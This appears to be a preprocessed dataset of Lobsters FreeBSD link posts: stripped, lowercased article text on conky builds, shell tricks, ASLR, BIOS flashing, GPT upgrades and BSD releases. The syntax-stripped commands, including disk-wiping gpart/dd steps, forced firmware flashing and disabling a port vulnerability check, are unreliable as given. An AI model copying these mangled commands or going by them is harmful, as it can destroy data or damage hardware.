later pwd usrportssysutils cd conky pwd usrportssysutilsconky make package depends file usrlocalsbinpkg found nt seem exist usrportsdistfiles attempting fetch http kb kbps fetching distfiles required building extracting checksum ok patching applying freebsd patch depends executable gmake found depends package libiconv found depends package pkgconf found depends file found depends file usrlocallibdatapkgconfigxextpc found depends file usrlocallibdatapkgconfigxdamagepc found depends file usrlocallibdatapkgconfigxfixespc found depends file usrlocallibdatapkgconfigxftpc found configuring freebsd autotools fix applied compressing man page compressman building package cleaning package usrportssysutilsconky directory usrportsdistfiles dir either use wrkdirprefix portsdir obj option etcmakeconf file somewhere usrportsobj grep wrkdirprefix etcmakeconf wrkdirprefix portsdir obj let find find usrportsobj name conky txz move root directory keep mv root clean portpackage building make c usrportssysutilsconky clean distclean cleaning delete installed conky version install working version pkg delete conky checking integrity done conflicting deinstallation requested following package package universe installed package removed number package removed proceed deinstalling package yn deinstalling deleting file pkg add installing extracting last check conky version conky version conky compiled tue mar cet freebsd compiled feature system config file usrlocaletcconkyconkyconf package library path usrlocallibconky xdamage extension xdbe double buffer extension xft argb visual music detection general math configoutput great needed conky version way thought much work take make debian centos without freebsd port infrastructure xbindkeys needed configuration xbindkeysrc one may different keyboard make sure catch needed key event cat xbindkeysrc scroll lock scroll lock scriptsdesktopdebugsh need information xbindkeys work read freebsd desktop part key component keyboardmouse shortcut episode script configs scriptsdesktopdebugsh script binsh pgrep q conky case killall conky scriptsopenboxrestartconkysh esac scriptsopenboxrestartconkysh script binsh killall conky nice n conky c conkyrc version profile nice n conky c conkyrc version profile nice n conky c conkyrc version profile nice n conky c conkyrc version profile nice n conky c conkyrc version profile nice n conky c conkyrc version profile nice n conky c conkyrc version profile nice n conky c conkyrc version profile nice n conky c conkyrc version profile nice n conky c conkyrc version profile loga nice n conky c conkyrc version profile logb nice n conky c conkyrc version profile logc use several laptop need distinguish config file used laptop use profile field set thinkpad example command defined file grep exec color eeeeee exec mount p awk print column color eeeeee exec tail n varlogautomountlog color eeeeee exec grep v e pulseaudiomessage repeatednullupdatechwroute failed sendpacket sure varlogmessages tail color eeeeee exec vmstat color eeeeee exec doas usbconfig color eeeeee exec p axwww cpu r command head p axwww cpu r command grep v conky grep v cpu sort n r head color eeeeee exec sockstat l cut c color eeeeee exec top io total b grep pid username tail n color eeeeee exec gstat p color eeeeee exec df g awk print column color eeeeee exec pciconf l color eeeeee exec ifconfig l u sed read ifconfig done diagram showing command placed use twelve conky configuration file purpose one command list df b pciconf c ifconfig sockstat top gstat vmstat usbconfig p mount varlogautomountlog varlogmessages next full conky configuration file alignment bottomleft background yes gapx gapy minimumsize maximumwidth doublebuffer yes drawoutline drawshades defaultoutlinecolor defaultshadecolor ownwindow yes ownwindowclass conky ownwindowcolour ownwindowtype override ownwindowtransparent updateinterval usexft yes xftfont ubuntu borderinnermargin borderoutermargin borderwidth text color sbinmount p color eeeeee exec mount p awk print column alignment bottomleft background yes gapx gapy minimumsize maximumwidth doublebuffer yes drawoutline drawshades defaultoutlinecolor defaultshadecolor ownwindow yes ownwindowclass conky ownwindowcolour ownwindowtype override ownwindowtransparent updateinterval usexft yes xftfont ubuntu borderinnermargin borderoutermargin borderwidth text color varlogautomountlog color eeeeee exec tail n varlogautomountlog alignment bottomleft background yes gapx gapy minimumsize maximumwidth doublebuffer yes drawoutline drawshades defaultoutlinecolor defaultshadecolor ownwindow yes ownwindowclass conky ownwindowcolour ownwindowtype override ownwindowtransparent updateinterval usexft yes xftfont ubuntu borderinnermargin borderoutermargin borderwidth text color varlogmessages color eeeeee exec grep v e pulseaudiomessage repeatednullupdatechwroute failed sendpacket sure varlogmessages tail alignment bottomleft background yes gapx gapy minimumsize maximumwidth doublebuffer yes drawoutline drawshades defaultoutlinecolor defaultshadecolor ownwindow yes ownwindowclass conky ownwindowcolour ownwindowtype override ownwindowtransparent updateinterval usexft yes xftfont ubuntu borderinnermargin borderoutermargin borderwidth text color usrbinvmstat color eeeeee exec vmstat alignment bottomleft background yes gapx gapy minimumsize maximumwidth doublebuffer yes drawoutline drawshades defaultoutlinecolor defaultshadecolor ownwindow yes ownwindowclass conky ownwindowcolour ownwindowtype override ownwindowtransparent updateinterval usexft yes xftfont ubuntu borderinnermargin borderoutermargin borderwidth text color usrsbinusbconfig color eeeeee exec doas usbconfig alignment bottomleft background yes gapx gapy minimumsize maximumwidth doublebuffer yes drawoutline drawshades defaultoutlinecolor defaultshadecolor ownwindow yes ownwindowclass conky ownwindowcolour ownwindowtype override ownwindowtransparent updateinterval usexft yes xftfont ubuntu borderinnermargin borderoutermargin borderwidth text color binps axwww cpu r command color eeeeee exec p axwww cpu r command head p axwww cpu r command grep v conky grep v cpu sort n r head alignment bottomleft background yes gapx gapy minimumsize maximumwidth doublebuffer yes drawoutline drawshades defaultoutlinecolor defaultshadecolor ownwindow yes ownwindowclass conky ownwindowcolour ownwindowtype override ownwindowtransparent updateinterval usexft yes xftfont ubuntu borderinnermargin borderoutermargin borderwidth text color usrbinsockstat l color eeeeee exec sockstat l cut c alignment bottomleft background yes gapx gapy minimumsize maximumwidth doublebuffer yes drawoutline drawshades defaultoutlinecolor defaultshadecolor ownwindow yes ownwindowclass conky ownwindowcolour ownwindowtype override ownwindowtransparent updateinterval usexft yes xftfont ubuntu borderinnermargin borderoutermargin borderwidth text color usrbintop io total color eeeeee exec top io total b grep pid username tail n alignment bottomleft background yes gapx gapy minimumsize maximumwidth doublebuffer yes drawoutline drawshades defaultoutlinecolor defaultshadecolor ownwindow yes ownwindowclass conky ownwindowcolour ownwindowtype override ownwindowtransparent updateinterval usexft yes xftfont ubuntu borderinnermargin borderoutermargin borderwidth text color usrsbingstat p color eeeeee exec gstat p alignment bottomleft background yes gapx gapy minimumsize maximumwidth doublebuffer yes drawoutline drawshades defaultoutlinecolor defaultshadecolor ownwindow yes ownwindowclass conky ownwindowcolour ownwindowtype override ownwindowtransparent updateinterval usexft yes xftfont ubuntu borderinnermargin borderoutermargin borderwidth text color bindf g color eeeeee exec df g awk print column alignment bottomleft background yes gapx gapy minimumsize maximumwidth doublebuffer yes drawoutline drawshades defaultoutlinecolor defaultshadecolor ownwindow yes ownwindowclass conky ownwindowcolour ownwindowtype override ownwindowtransparent updateinterval usexft yes xftfont ubuntu borderinnermargin borderoutermargin borderwidth text color usrsbinpciconf l color eeeeee exec pciconf l alignment bottomleft background yes gapx gapy minimumsize maximumwidth doublebuffer yes drawoutline drawshades defaultoutlinecolor defaultshadecolor ownwindow yes ownwindowclass conky ownwindowcolour ownwindowtype override ownwindowtransparent updateinterval usexft yes xftfont ubuntu borderinnermargin borderoutermargin borderwidth text color sbinifconfig color eeeeee exec ifconfig l u sed read ifconfig done thats quite lot configuration file think configuration done serve many many time future conky configuration file suited resolution modify value gapxgapyminimumsizemaximumwidth parameter make fit resolution initially wanted write scriptgenerator let face able properly cover possible resolution update latest conky also work wrote article wrote older conky version needed exactly could retrieved using portdowngrade sysutilsconky command conky introduced many bug along entirely new configuration format latest conky package box exact work like charm conky configuration still bug passing mouse click desktop want make leftmiddleright click desktop aim place conky dashboard space course still follow original article fetchbuild conky version working leftmiddleright mouse click desktop eof like like loading related
253,Lobsters,freebsd,FreeBSD,Ghost in the Shell - Part 4,https://vermaden.wordpress.com/2019/03/15/ghost-in-the-shell-part-4/,ghost shell part,part ghost shell global page named pipe cd tmp mknod tmppipe p chown oracle oinstall tmppipe dd iftmppipe gzip mntoracleoracledatabasebackupdmpgz tmppipe su oracle dump filetmppipe freebsd desktop part configuration modify command environment fly gls l head env gls l head env disablevulnerabilitiesyes make c usrportssecuritybdes build install clean tr cd devrandom head c env lcallc tr cd devrandom head c date env tzaustraliadarwin date real path pwd ln homevermaden asd cd asd pwd realpath browsing path export ifs echo path echo done echo path find name ifconfig done echo path tr n read echo done echo path tr n read find name dd done echo path n echo path n read find name camcontrol done parameter expansion parameter result desc name name name name name parameter result desc name name name name name url http vermadenwordpresscom echo url sort human readable value du sh usr du sh usr sort h zfs list sort h k write file different right w doas tee q w doas tee vi w doas doas tee doas vi search content pdf file cd booksunixbsdjournal exa pdfgrep n bhyve pdf like,long time see since last post ghost shell series also exactly one full year since started blog first ghost shell series article part published day today would like show new pack useful trick feature productive terminalshell use let start something simple yet useful may want check article ghost shell series ghost shell global page find link episode series along table content episode content named pipe least know love pipe unix record l grep match awk print sed sjpgg command chain like one named pipe manually defined pipe special purpose example application especially called enterprise one often support unix pipe mechanism dump something file great example enterprise software oracle database whose dump command make dump file tool support unix pipe would probably want pipe data gzip xz compress fly even pipe directly ssh backup server example oracle named pipe feature help create named pipe called tmppipe oracle dump command able use side pipe attach pipe gzip command compress data fly example linux system mknod command used example freebsd would use mkfifo command named pipe complete example named pipe presented root cd tmp root mknod tmppipe p root chown oracle oinstall tmppipe root dd iftmppipe gzip mntoracleoracledatabasebackupdmpgz tmppipe named pipe ready used process start write something tmppipe named pipe automatically grabbed dd command piped gzip command compress input write mntoracleoracledatabasebackupdmpgz file start oracle dumping process dump command root su oracle oracle dump filetmppipe dump command finish work find dumped data compressed mntoracleoracledatabasebackupdmpgz file example named pipe usage desktop setup unusual update schedule described detail freebsd desktop part configuration article modify command environment fly time use export builtin export needed environment value command need check environment exported value env command course use env command run command modified environment without exporting variable using export brief example feature record gls command gnulinux l command sysutilscoreutils packageport make work without name conflict freebsd bsd l also present renamed gls gls l head total env gls l head razem example run gls command default environment use locale daily second invocation modified environment made gls command display output polish language word razem mean total polish useful example may using make build freebsd port known vulnerability default freebsd build system allow u build port good default know use following spell env disablevulnerabilitiesyes make c usrportssecuritybdes build install clean also useful command play well input like tr example lcall set throw error upon tr cd devrandom head c tr illegal byte sequence wanted generate random number make work modify lcall environment invocation env lcallc tr cd devrandom head c much better example timezones using date command tz variable shown example date fri mar cet env tzaustraliadarwin date fri mar acst real path symlinks ln useful many way organize stuff quick fix versioning find ton use case one problem make many level symlinks much nested know anymore realpath come handy matter many level link made tell truth current real path pwd command help thou short example work pwd homevermaden ln homevermaden asd cd asd pwd homevermadenasd realpath homevermaden browsing path many time wanted browse path search something possibly know path variable store path colon separated redefine ifs variable default contains space work field delimited loop example export ifs echo path echo done sbin bin usrsbin usrbin usrlocalsbin usrlocalbin echo path find name ifconfig done sbinifconfig way use plain old tr tool translate colon newlines n able use loop tr example echo path tr n read echo done sbin bin usrsbin usrbin usrlocalsbin usrlocalbin echo path tr n read find name dd done bindd also achieve thing using parameter expansion change colon newlines n shown example echo path n sbin bin usrsbin usrbin usrlocalsbin usrlocalbin echo path n read find name camcontrol done sbincamcontrol parameter expansion show possible parameter expansion method useful one typical use get extension file emulate basename dirname command faster use parameter expansion instead invoking command time two table showing get parameter expansion method parameter result desc name kubicapolishracinglegend content name polishracinglegend name legend extension name kubica name kubicapolishracing slash character parameter result desc name kubicapolishracinglegend content name polishracinglegend name legend basename name kubica root directory name kubicapolishracing dirname also use parameter expansion method grab protocol url like shown url http vermadenwordpresscom echo url http sort human readable value simple easy sort numerical value use sort n value sometimes come human readable form like sort properly use sort h flag shown example du sh usr usrbin usrhome usrinclude usrlib usrlibdata usrlibexec usrlocal usrobj usrsbin usrshare usrtests du sh usr sort h usrobj usrlibdata usrtests usrlibexec usrinclude usrsbin usrshare usrlib usrbin usrlocal usrhome value first column simple value first column use k parameter sort take column sort argument needed example sorted bu human readable value second used column zfs list sort h k name used avail refer mountpoint localusrobj usrobj localvarcachepkg varcachepkg localvarcache none localvar none localusrports usrports localjailnextcloud jailnextcloud localjail jail localusrsrc usrsrc localusr none sysroot none sys none localhome home local none write file vi different right many time opened system configuration file like etcsysctlconf etcfstab favorite vi editor made change wanted save luck trying write file owned root regular user readonly file written use override message displayed course save file somewhere else like home directory move doas sudo su help original location fix right may one step instead opening file vi change write file doas sudo right need type w doas tee exit vi editor force q look editor w doas tee file content displayed press key continue enter ex command enter legend spell vi prompt w write file doas invoke doas command tee command started using doas command tell vi use current filename process current vi content redirected using tee doas right current open opened filename course also work vim neovim sudo poison use sudo instead doas search content pdf file love plain text file searched using grep data interesting u grep work pdf file say pointlessuseless use grep search pdf file fortunately pdfgrep command exists work beautifully pdf file including colored output recently freebsd journal made free like search bhyve article freebsd journal issue command cd booksunixbsdjournal exa freebsd journal freebsd journal freebsd journal freebsd journal freebsd journal freebsd journal freebsd journal freebsd journal freebsd journal freebsd journal freebsd journal freebsd journal freebsd journal freebsd journal freebsd journal freebsd journal freebsd journal freebsd journal freebsd journal freebsd journal freebsd journal freebsd journal freebsd journal freebsd journal freebsd journal freebsd journal freebsd journal freebsd journal freebsd journal freebsd journal freebsd journal pdfgrep n bhyve pdf freebsd journal old machine hypervisors bhy freebsd journal old bhyve freebsd journal old bhyve bsd hypervisor de freebsd journal old grehan neel natu desig freebsd journal old bhyve requires intel cpu w freebsd journal old bhyve appeared freebsd freebsd journal machine hypervisors bhyve virtual freebsd journal bhyve e freebsd journal bhyve bsd hypervisor developed p freebsd journal grehan neel natu design goal bh freebsd journal bhyve requires intel cpu vtx freebsd journal bhyve appeared freebsd look xterm terminal hope today pack spell end useful eof like like loading related
254,Lobsters,freebsd,FreeBSD,EuroBSDcon CFP is open,https://registration.eurobsdcon.org/conferences/2019/program/proposals/new,eurobsdcon cfp open,,authorized access page maybe need sign
255,Lobsters,freebsd,FreeBSD,Console Hacking 2016: PS4 PC Master Race,https://media.ccc.de/v/33c3-7946-console_hacking_2016,console hacking pc master race,marcan video starting audio related event download file contain multiple language related tag,marcan playlist video starting audio related event last year demonstrated linux running lightning talk presented departure previous console hacking talk focusing security year going focus hardware make different pc reverse engineered enough get fullblown linux distro running complete acceleration download file contain multiple language talk translated multiple language file available download contain language separate audiotracks desktop video player allow choose please look audio track desktop video player related tag
256,Lobsters,freebsd,FreeBSD,Light-weight Contexts: An OS Abstraction for Safety and Performance (2016),https://people.mpi-sws.org/~druschel/publications/osdi16.pdf,lightweight context o abstraction safety performance,,obj length filter flatedecode stream xڭ yӿw ht c ۀ
257,Lobsters,freebsd,FreeBSD,Awesome BSD: Curated List of BSD related software,https://github.com/DiscoverBSD/awesome-bsd,awesome bsd curated list bsd related software,awesome bsd structure operating system bitrig source code bsd router project freebsd quagga bird dragonfly bsd edgebsd bsd netbsd git pkgsrc freebsd platform community busiest web furybsd ghostbsd trueos hardenedbsd litebsd midnightbsd miro nomadbsd netbsd nextbsd openbsd proactive security integrated cryptography openssh opnsense pfsense raspbsd retrobsd smallwall trueos zrouter bsd news news site podcasts bsdnow bsdtalk garbage archive forum community forum reddit meetups user group community initiative bsd hardware dmesgd learning bsd certification group teachbsd book bsd related software bastille cbsd runhyve gaming,awesome bsd document database link related bsd operating system bsd software license structure follows operating system section find official bsd os link alphabethical order short description found page bitrig bitrig free fast secure unixlike open source operating system available current hardware platform source code freely available permissive license bsd router project bsd router project bsdrp embedded free open source router distribution based freebsd quagga bird dragonfly bsd dragonfly belongs class operating system bsdderived system linux based unix ideal apis share ancestor code bsd operating system dragonfly provides opportunity bsd base grow entirely different direction one taken freebsd netbsd openbsd series edgebsd edgebsd new member family bsdbased operating system starting development current netbsd codebase git source code management package management based pkgsrc freebsd freebsd advanced computer operating system used power modern server desktop embedded platform large community continually developed thirty year advanced networking security storage feature made freebsd platform choice many busiest web site pervasive embedded networking storage device furybsd furybsd brand new open source freebsd desktop furybsd pay homage desktop bsd project past like pcbsd trueos graphical interface add additional tool like live hybrid usb dvd image furybsd available either xfce kde ghostbsd ghostbsd userfriendly bsd operating system built top trueos ghostbsd aim provide familiar workstation feature benefit freebsd combined twist mate desktop environment focus userfriendliness available version ghostbsd suitable newcomer well experienced bsd user hardenedbsd hardenedbsd securityenhanced fork freebsd hardenedbsd project implementing many exploit mitigation security technology top freebsd litebsd litebsd variant operating system microcontrollers currently microchip family supported processor mmu paging support onchip ram resource enough run midnightbsd midnightbsd new bsdderived operating system developed desktop user mind includes software expect daily task email web browsing word processing gaming much small community dedicated developer midnightbsd strives create easytouse operating system everyone use freely available virtual machine miro miro bsd secure operating system bsd family sparc system based mostly openbsd mirports framework portable port tree facilitate installation additional software project also release portable software mksh pdkshbased shell paxmirabilis archiver various format mirmake framework building software mirnroff nroff based man page text document formatter mircksum flexible checksumming hash generation tool nomadbsd nomadbsd live system usb flash drive based freebsd together automatic hardware detection setup configured used desktop system work box also used data recovery netbsd netbsd free fast secure highly portable unixlike open source operating system available wide range platform largescale server powerful desktop system handheld embedded device clean design advanced feature make excellent use production research environment source code freely available businessfriendly license netbsd developed supported large vivid international community many application readily available pkgsrc netbsd package collection nextbsd nextbsd code name science project name tongueincheek serious naming project hard started effort adapt interesting open source technology darwinos x freebsd openbsd openbsd project produce free multiplatform unixlike operating system effort emphasize portability standardization correctness proactive security integrated cryptography example effect openbsd popular openssh software come openbsd opnsense opnsense open source easytouse easytobuild freebsd based firewall routing platform opnsense includes feature available expensive commercial firewall many case fork turn forked fast open secure replacement operating system window macos built top netbsd provides simple desktoporiented operating system pfsense software free open source customized distribution freebsd specifically tailored use firewall router entirely managed via web interface addition powerful flexible firewalling routing platform includes long list related feature package system allowing expandability without adding bloat potential security vulnerability base distribution raspbsd raspbsd image freebsd preconfigured two different image raspberry pi computer soon retrobsd retrobsd port unix intended embedded system fixed memory mapping current target microchip microcontroller kbytes ram kbytes flash processor mips architecture executable data memory flexible ram partitioning user kernel mode smallwall long time ago smart guy asked simple question firewall big slow hard configure created amazingly successful successful freebsd based core used basis several project pfsense askozia freenas recently grandchild spawned pfsense opnsense retired u still feel need small lean firewall smallwall firewall decided close door development planned people created fork trueos formerly known pcbsd make different based legendary security stability freebsd follows freebsd current latest driver security update package available also brand new driver package brings support newer intel graphic chipsets hardware pride providing industry leading feature like personacrypt allows encrypting user home directory carrying machine also support geli full disk encryption keeping data secure even case physical theft go ahead give u try hit snag along way glad help zrouter zrouterorg freebsd based firmware embedded device bsd news section find site presenting news bsd news site podcasts bsdnow weekly bsd podcast featuring news interview tutorial ogg bsdtalk talking bsd family free operating system garbage archive podcast technology much garbage archived episode forum community forum reddit meetups user group community initiative bsd hardware project collect hardware detail bsdpowered computer help user developer debug hardware related issue check compatibility find driver dmesgd usersubmitted repository searchable bsd dmesgs maintained nyc bug learning bsd certification group bsd certification group inc nonprofit organization committed creating maintaining global certification standard system administration bsd based operating system teachbsd teaching operating system tracing set course student software practitioner book bsd related software bastille bastille help quickly create manage freebsd jail cbsd cbsd management layer written freebsd jail subsystem bhyve xen runhyve virtual machine manager bhyve gaming
259,Lobsters,freebsd,FreeBSD,Implement Address Space Layout Randomization (ASLR),https://svnweb.freebsd.org/changeset/base/343964,implement address space layout randomization aslr,http,log message implement address space layout randomization aslr change randomization enabled nonfixed mapping mean base address mapping selected guaranteed amount entropy bit mapping requested superpage aligned randomization honour superpage attribute although value aslr diminshing time exploit author work simple aslr bypass technique elimintates trivial exploitation certain vulnerability least theory implementation relatively small happens correct architectural level also expected introduce regression existing case turned default cause significant maintaince burden randomization done besteffort basis allocator fall back first fit strategy fragmentation prevents entropy injection trivial implement strong mode failure guarantee requested amount entropy result mapping request failure consider usable finetuned amount entropy injected right quantitive change change implementation current amount controlled aslrpagesrnd spoil coalescing optimization reduce page table fragmentation inherent aslr keep transient superpage promotion malloced memory locality clustering implemented anonymous private mapping automatically grouped fragmentation kick initial location anon group range course randomized controlled vmclusteranon enabled default default mode keep sbrk area unpopulated mapping turned give much breathing bit architecture small address space tied question following application hint mmap base address testing show ignoring hint affect function common application would expect demanding code could break default sbrk preserved mmap hint satisfied changed using kernelf aslrhonorsbrk sysctl aslr enabled perabi basis currently allowed freebsd native including compat abis support additional architecture added testing perprocess perimage control implemented procctl add procaslrctlprocaslrstatus ntfreebsdfctlaslrdisable feature control note bit make possible force aslr given binary tool edit feature control note development global control kernelf aslrenable nonfixed mapping done mmap kernelf aslrpieenable pie image activation mapping kernelf aslrhonorsbrk allow use sbrk area mmap vmclusteranon enables anon mapping clustering pr exp run expruns done antoine reviewed markj previous version discussed emaste tested pho mfc month sponsored freebsd foundation differential revision http
260,Lobsters,freebsd,FreeBSD,Flashing the BIOS on the PC Engines APU4c4,https://github.com/lattera/articles/blob/master/hardware/apu/2019-02-05_flashing_bios/article.md,flashing bios pc engine,flashing bios pc engine pc engine pc engine github page update feb well get already,flashing bios pc engine absolutely love pc engine apu device use testing hardenedbsd experimental feature constrained environment firewall usb msata port quirk bumped major quirk required flashing different bios workaround article detail hacky way went reason hacky way upgrade opnsense failed partway leaving unbootable system prompted article something either cam geom layer freebsd caused msata hang preventing file writes opnsense us freebsd whereas recentlyreleased opnsense us hardenedbsd based freebsd reached pc engine directly let know issue known bios issue flashing legacy bios series would provide working system also happens new legacy bios version released turn ecc mode ram get working opnsense install ecc ram one bird dinner dessert though using instruction work apu device bios rom download url changed reflect device targeting along bios version wish deploy special note dragon primarily writing article document procedure purpose memory tends pretty faulty day something go wrong please hold responsible one keyboard special note use msata drive swap space case swap space used destroy ever disk post also assumes know way around bsd system need modify command accomodate setup time writing feb bios release found pc engine github page update feb multiple people reporting success running firmware nt want run legacy build might give try well get already need thing get started need download hardenedbsd installation image use memstick image since going boot usb thumbdrive latest build found write thumbdrive dd statusprogress plug memstick apu attach serial cable system connect using cu cu l prompted press boot usb see hardenedbsd bootloader screen pop select third option escape loader prompt type following command serial console access set comconsolespeed set console comconsole boot prompted select terminal type case enter xterm next selected option install hardenedbsd select livecd mode instead login passwordless root account going set swap first preparation ramdrive hold chroot filesystem create ramdisk hold live environment format ramdisk ufs mount create two directory one hold downloaded binary update hold chroot filesystem following set networking gpart destroy f gpart create gpt gpart add freebsdswap swapon mdconfig newfs mount mnt mkdir p mntupdate root dhclient hardenedbsd created binary update utility base similar scope freebsdupdate called hbsdupdate use populate mntroot copy etcresolvconf dns work within chroot finally mount devfs chroot hbsdupdate vdnu mntupdate r mntroot cp etcresolvconf mntrootetc mount devfs devfs mntrootdev ready dive chroot environment install flashrom carootnss package download bios flash special extra crucial note make sure downloading right bios system blame simply copy next command verbatim without first ensuring apply system chroot mntroot pkg install flashrom carootnss fetch http tar xf flashrom p internal boardmismatchforce w flashed legacy bios go ahead shutdown system shutdown p go merry way know enjoying new opnsense installation
261,Lobsters,freebsd,FreeBSD,Netflix and FreeBSD - Using Open Source to Deliver Streaming Video - FOSDEM 2019,https://fosdem.org/2019/schedule/event/netflix_freebsd/attachments/slides/3103/export/events/attachments/netflix_freebsd/slides/3103/FOSDEM_2019_Netflix_and_FreeBSD.pdf,netflix freebsd using open source deliver streaming video fosdem,,obj type catalog name javascript r pagelabels nums st outline r page r endobj obj creator g g l e endobj obj type page parent r mediabox content r resource r annots r group transparency c devicergb endobj obj filter flatedecode length r stream ư
262,Lobsters,freebsd,FreeBSD,FreeBSD upgrade procedure using GPT,https://oshogbo.vexillium.org/blog/62/,freebsd upgrade procedure using gpt,wikipedia,different way upgrade operating system example using zfs root file system use boot environment accomplish task quick simple safe way boot environment new thing freebsd however today discus oldschool approach problem using gpt flag approach may used upgrade operating system nt use zfs want system readonly partition example building appliance analyze challenge use gpt poster made jared atkinson gpt divided two part gpt header partition array see every partition entry contains attribute operating system may implement different one according wikipedia microsoft already using bit readonly hidden automount freebsd implement three extra one bootme bootonce bootfailed respectively use bit used antyhing else bootme attribute point partition used boot partition two flag bootme bootonce partition chosen booted used bootloader accomplish simply removing bootme attribute bootfailed attribute used indicate partition used booting process interrupted let look sample scenario failed boot let create gpt table contains partition gpart create gpt gpart add freebsdboot gpart add freebsdufs gpart add freebsdufs gpart set bootme gpart show gpt freebsdboot freebsdufs bootme freebsdufs freebsdufs scenario go like boot partition ufs flag bootme upload upgrade override ufs partition dd ifsomeimg set bootonce bootme flag setting bootonce automatically also set bootme attribute gpart set bootonce gpart show gpt freebsdboot freebsdufs bootme freebsdufs bootonce bootme freebsdufs reboot machine bootme flag removed bootloader freebsdufs bootme freebsdufs bootonce upgrade error accrued example unable boot kernel machine rebooted bootloader replace bootonce flag bootfailed freebsdufs bootme freebsdufs bootfailed another partition bootonce bootme attribute tried boot partition ufs flag bootme report failure upgrade successful difference system remove bootonce flag report success reporting done startup script etcrcdgptboot using bootonce flag upgrade procedure good idea modify script upgrade successful change bootonce bootme flag remove bootme flagsthe logic bootloader also complicated presented multiple bootonce bootme attribute set problem booting kernel need reboot machine loader try kernel pointed prefer reboot useful upgrade process handling complicated thing like example upgrading database imagine one additional partition data contains database instance one startup script upgrading database upgrade fails roll back change boot old partition
263,Lobsters,freebsd,FreeBSD,OPNsense 19.1 Released,https://forum.opnsense.org/index.php?topic=11398.0,opnsense released,http http http http http http opnsenseorgdownload http docsopnsenseorgmanualinstallhtml http docsopnsenseorgmanualetprotelemetryhtml http githubcomopnsensepluginsblobmasternetvnstatpkgdescr http http http http bugzillasudowsshowbugcgi http docsopnsenseorgmanualdynamicroutinghtml,hi four year opnsense driving innovation modularising hardening open source firewall simple reliable firmware upgrade multilanguage support hardenedbsd security fast adoption upstream software update well clear stable bsd licensingthe release nicknamed inspiring iguana consists total individual change since came month ago spread intermediate release including recent release candidate average stable release per month security update important bug fix included pick highlight would firewall alias api finally place migration hardenedbsd completed work remote ldap local totp combination openvpn client export rewritten full api support welldownload link installation guide checksum image found wello europe http u east coast http u west coast http south america http southeast asia http full mirror list http opnsenseorgdownloadthese prominent change since version fully functional firewall alias apio pie firewall shaper supporto firewall nat rule logging supporto via ldaptotp combinationo wpad pac parent proxy support web proxyo certificate export custom passwordso dpinger default gateway monitoro et pro telemetry edition plugin extended duid supporto dnsmasq dnssec supporto openvpn client export apio realtek nic driver version hardenedbsd libressl unbound suricata phalcon perl firmware health check extended cover o file http mirror defaulto update browser cachesafe regarding cs javascript assetso collapsible side bar menu default themeo language update chinese czech french german japanese portuguese russiano api backup export bind hardware widget nginx ntopng vnstat dnscryptproxy pluginshere full change version ipsec add firewall interface soon phase enabledo ipsec phase selection gui javascript compatibility fixo monit widget improvement bug fix contributed frank brendel ui fix regression single host network subnet select static page plugins osfrr update osfp outbound rule contributed fabian franz plugins ostelegraf fix packet filter inputo plugins osthemerebellion add image colour inverto plugins osvnstat plugins oszabbixagent us zabbix version src revert mmccalculateclock support break legacy supporto src update src import tzdata src avoid unsynchronized update knstatus port carootnss port prevent rawops doublefree contributed team rebellion port sudo patch fix listpwnever migration note minor incompatibility look gateway health graph may need manual reset due apinger dpinger migration apinger longer availableo intrusion detection geoip rule automatically deactivated need manually migrated firewall alias geoipo quagga plugin superseded frr plugin binary quagga package conserved time beingo please read frr documentation regard required system tunables bhyve uefi boot may fail guest problem investigatedo snmp plugin superseded netsnmp pluginthe public key series begin public key end public key stay safe opnsense team http docsopnsenseorgmanualinstallhtml http docsopnsenseorgmanualetprotelemetryhtml http githubcomopnsensepluginsblobmasternetvnstatpkgdescr http http http http bugzillasudowsshowbugcgi http
264,Lobsters,freebsd,FreeBSD,"EuroBSDcon 2019 – Lillehammer September 19-22, 2019",https://2019.eurobsdcon.org/,eurobsdcon lillehammer september,livestream program change,european bsd conference underway watch livestream program change dave cottlehuber unavoidably detained able give talk valemon place eric allman speak learned
265,Lobsters,freebsd,FreeBSD,ClonOS to be Rolled Out,https://hype.codes/clonos-be-rolled-out,clonos rolled,challenge medium portal blockchain design development use opensource user interface result,challenge founder hypecodes approached u goal building medium portal would present uptodate relevant news programming technology tech innovation blockchain cryptocurrency development client partnered medium company cryptocurrency leader online content creator striving dominate technologyrelated medium market three month develop impressive portal vastly different design identity competitor seeking partner could deliver website accurately reflected ethos something new stylish unique featured streamlined userfriendly structure ensure reader miss important news design development hypecodes team wanted use opensource drupal platform since facilitates building amazing digital experience convenient affordable solution market offer used technology like drupal bootstrap ensure content creator user would get best experience desktop mobile device portal made responsive compatible device wanted make sure hypecodes team practical userfriendly admin panel integrated convenient content management system also added feature ensures advertisement news banner portal negatively affect interface structure news section portal needed easy navigate utilized intuitive browsing feature inserted search option header every page hypecodes founder envisioned creative userfriendly news portal would attract attention reader completely different identity existing cryptorelated portal keep fastpaced world medium portal needed flexible easily updated designed portal way allowed layout interface color scheme easily changed needed marketing technical content graphic expert made sure website scored high front three month hypecodes everything needed successful start outstanding identity brand book fresh design convenient user interface streamlined content management system result hypecodes become valuable resource professional web developer anyone interested cryptocurrency blockchain technology portal delivers latest news software technology reallife usage provides current relevant update financial market cryptocurrencies blockchainrelated project forecast future programming language technology userfriendly interface responsive design helped hypecodes increase brand exposure attract new reader build stronger relationship existing user hypecodes well known european american crypto community team frequent guest tech conference world
266,Lobsters,freebsd,FreeBSD,HardenedBSD 2018Q4 Status Report,https://github.com/HardenedBSD/freebsd-quarterly/blob/hardenedbsd/2018q4/2018q4/hardenedbsd.md,hardenedbsd status report,hardenedbsd update introduction hardenedbsd hardenedbsd foundation update hardenedbsd released noncrossdso cfi,hardenedbsd update introduction hardenedbsd hardenedbsd securityenhanced fork freebsd aim provide bsd community cleanroom reimplementation publiclydocumented part grsecurity patchset linux maintain close compatibility freebsd syncing every six hour freebsd hardenedbsd foundation update generous donation def con computer security conference held year la vega anonymous member community hardenedbsd foundation able provide hardenedbsd project new cavium server hardenedbsd working closely freebsd cavium jayachandran jchandra freebsd gain working support soon becomes functional hardenedbsd able support assisted opnsense migration freebsd hardenedbsd base operating system opnsense january release complete migration work done enable hardenedbsd pax noexec implementation opnsense pax noexec strong form wx prevents memory allocation writable executable toggling two hardenedbsd foundation corp registered c taxexempt notforprofit charitable organization united state look forward productive work support crossdso cfi still ongoing hardenedbsd released december hardenedbsd published first official release release announcement improvement noncrossdso controlflow integrity cfi application time cfi applied kernel info cfi jailed bhyve upstreamed freebsd perjail toggle unprivileged process debugging securitybsdunprivilegedprocessdebug sysctl node upstreamed freebsd spectre mitigation retpoline applied entirety base port port opting symmetric multithreading smt disabled default reenable setting machdephyperthreadingallowed loaderconf migration compiler 